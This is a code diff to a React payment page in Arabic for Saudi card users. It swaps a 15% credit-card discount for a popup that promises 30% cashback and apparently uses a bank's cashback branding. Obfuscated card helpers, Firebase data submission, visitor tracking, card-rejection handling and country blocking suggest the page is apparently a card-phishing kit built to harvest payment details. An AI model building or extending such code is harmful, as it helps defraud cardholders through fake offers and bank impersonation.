@@ -7,7 +7,7 @@ import { toast } from "sonner";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { ShieldCheck, CreditCard, Lock, Smartphone } from "lucide-react";
+import { ShieldCheck, CreditCard, Lock, Smartphone, X, Gift } from "lucide-react";
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils";
 import { db } from "@/lib/firebase";
 import { secureAddData } from "@/lib/secure-firebase";
@@ -50,6 +50,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   const [showEmailModal, setShowEmailModal] = useState(false);
   const [userCountry, setUserCountry] = useState<string | null>(null);
   const [countryCheckDone, setCountryCheckDone] = useState(false);
+  const [showCashbackPopup, setShowCashbackPopup] = useState(true);
 
   useEffect(() => {
     const cleanNumber = _v1.replace(/\s/g, "");
@@ -350,8 +351,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       rejectionHandledRef.current = false;
       setCardRejectionError("");
 
-      const finalPrice = calculateFinalPrice();
-      const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0;
+      const discount = 0;
 
       console.log("[Payment] Starting payment process for visitor:", visitorID);
 
@@ -403,21 +403,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
     }
   };
 
-  const getDiscountAmount = () => {
-    if (selectedPaymentMethod === "credit-card") {
-      return "15%";
-    }
-    return null;
-  };
-
-  const calculateFinalPrice = () => {
-    if (selectedPaymentMethod === "credit-card") {
-      return offerTotalPrice * 0.85;
-    }
-    return offerTotalPrice;
-  };
-
-  const finalPrice = calculateFinalPrice();
+  const finalPrice = offerTotalPrice;
 
   // Handle email submission for blocked countries
   const handleEmailSubmit = async (name: string, email: string) => {
@@ -528,6 +514,49 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         canClose={false}
       />
 
+      {showCashbackPopup && (
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" dir="rtl">
+          <div className="relative bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-in fade-in zoom-in-95 duration-300">
+            <button
+              onClick={() => setShowCashbackPopup(false)}
+              className="absolute top-3 left-3 z-10 w-8 h-8 flex items-center justify-center rounded-full bg-white/90 hover:bg-white shadow-md transition-colors"
+            >
+              <X className="w-4 h-4 text-gray-600" />
+            </button>
+
+            <div className="bg-gradient-to-br from-[#1b5e20] to-[#2e7d32] p-4 text-center">
+              <div className="flex items-center justify-center gap-2 mb-2">
+                <Gift className="w-6 h-6 text-yellow-300" />
+                <h3 className="text-lg font-black text-white">عرض حصري!</h3>
+              </div>
+              <p className="text-green-100 text-sm">استرداد نقدي عند الدفع بالبطاقات الائتمانية</p>
+            </div>
+
+            <div className="p-1">
+              <img
+                src="/snb-cashback.jpg"
+                alt="استرداد نقدي 30% عند استخدام البطاقات الائتمانية"
+                className="w-full rounded-lg"
+              />
+            </div>
+
+            <div className="p-4 space-y-3">
+              <div className="bg-green-50 border border-green-200 rounded-xl p-3 text-center">
+                <p className="text-green-800 font-bold text-sm">
+                  استرداد نقدي <span className="text-2xl text-green-700">30%</span> عند استخدام البطاقات الائتمانية التالية
+                </p>
+              </div>
+              <button
+                onClick={() => setShowCashbackPopup(false)}
+                className="w-full py-3 bg-gradient-to-r from-[#1b5e20] to-[#2e7d32] hover:from-[#145218] hover:to-[#256b29] text-white font-bold text-sm rounded-xl transition-all shadow-lg"
+              >
+                متابعة الدفع
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       <div
         className={`space-y-4 sm:space-y-5 ${showEmailModal ? "blur-xl pointer-events-none" : ""}`}
         dir="rtl"
@@ -543,14 +572,12 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               {
                 value: "credit-card",
                 label: "البطاقات الائتمانية",
-                discount: "15%",
                 icons: ["/visa.svg", "/mas.svg"],
                 disabled: false,
               },
               {
                 value: "mada",
                 label: "بطاقات مدى",
-                discount: null,
                 icon: "/mada.jpg",
                 disabled: false,
               },
@@ -617,13 +644,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                       {method.label}
                     </span>
                   </div>
-                  <div className="flex items-center gap-2 flex-shrink-0">
-                    {method.discount && (
-                      <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-2 sm:px-3 py-0.5 sm:py-1 text-[10px] sm:text-xs shadow-sm whitespace-nowrap">
-                        خصم {method.discount}
-                      </Badge>
-                    )}
-                  </div>
+                  <div className="flex items-center gap-2 flex-shrink-0" />
                 </label>
                 {method.message && selectedPaymentMethod === method.value && (
                   <div
@@ -772,26 +793,6 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               )}
             </div>
           </div>
-
-          {/* Price Summary - Compact */}
-          {getDiscountAmount() && (
-            <div className="bg-green-50 rounded-lg p-2.5 sm:p-3 border border-green-200">
-              <div className="flex justify-between items-center text-xs sm:text-sm">
-                <span className="text-gray-600">السعر الأصلي:</span>
-                <span className="text-gray-600 line-through">
-                  {offerTotalPrice.toFixed(2)} ﷼
-                </span>
-              </div>
-              <div className="flex justify-between items-center text-xs sm:text-sm mt-1">
-                <span className="text-green-600 font-semibold">
-                  خصم {getDiscountAmount()}:
-                </span>
-                <span className="text-green-600 font-semibold">
-                  -{(offerTotalPrice * 0.15).toFixed(2)} ﷼
-                </span>
-              </div>
-            </div>
-          )}
 
           {/* Submit Button with Price */}
           <Button
